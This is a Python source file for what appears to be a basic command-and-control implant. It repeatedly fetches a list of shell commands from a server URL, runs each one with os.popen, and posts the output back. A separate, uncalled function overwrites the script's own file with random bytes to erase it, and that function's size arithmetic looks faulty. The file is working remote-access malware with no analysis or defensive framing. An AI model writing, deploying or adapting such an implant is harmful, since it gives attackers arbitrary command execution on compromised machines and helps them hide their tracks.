import json
import os
import time
import urllib.request

global SERVER_URL
SERVER_URL = "http://localhost:8000"

global SLEEP # time to sleep in seconds
SLEEP = 1#60

def execute(cmd):
    """execute a command and return the output"""
    try:
        stdout = os.popen(cmd)
        output = stdout.read() # wait until child process terminates
    except (IOError, OSError):
        try:
            stdout.close()
        except (IOError, OSError):
            return ''
    return output

def mainloop():
    """repeatedly beacon to server"""
    while 1:
        cmds = []
        print("beaconing")
        
        try:
            response = urllib.request.urlopen(SERVER_URL + "/commands.json",
                timeout = 10)
            response_body = response.read()
            cmds = json.loads(response_body)
        except:
            pass
        print("executing commands")
        
        for cmd in cmds:
            output = execute(cmd)
            print_command(cmd, output)
            print("uploading output")
            respond(output)
        print("sleeping %.2f seconds" % SLEEP)
        time.sleep(SLEEP)

def print_command(cmd, out):
    """print a command and its output"""
    print("\"%s\":\n\t" % cmd.replace('\"', "\\\""),
        out.replace('\n', "\n\t"), sep = '')

def respond(output):
    """respond to the server"""
    try:
        urllib.request.urlopen(SERVER_URL + "/output.txt", output.encode(),
            timeout = 10).read() # send the request
    except:
        pass

def shredC2():
    """shreds the current file"""
    try:
        fp = open(os.path.realpath(__file__), "r+b")
        fp.seek(0, os.SEEK_END)
        size = fp.tell() # get the number of bytes in the current file
        fp.seek(0, os.SEEK_SET)
        
        while size > 0: # overwrite with random bytes
            fp.write(os.urandom(size % 1048576))
            fp.flush()
            os.fdatasync(fp.fileno()) # sync to disk
            size /= 1048576
        fp.close()
    except:
        pass

if __name__ == "__main__":
    mainloop()
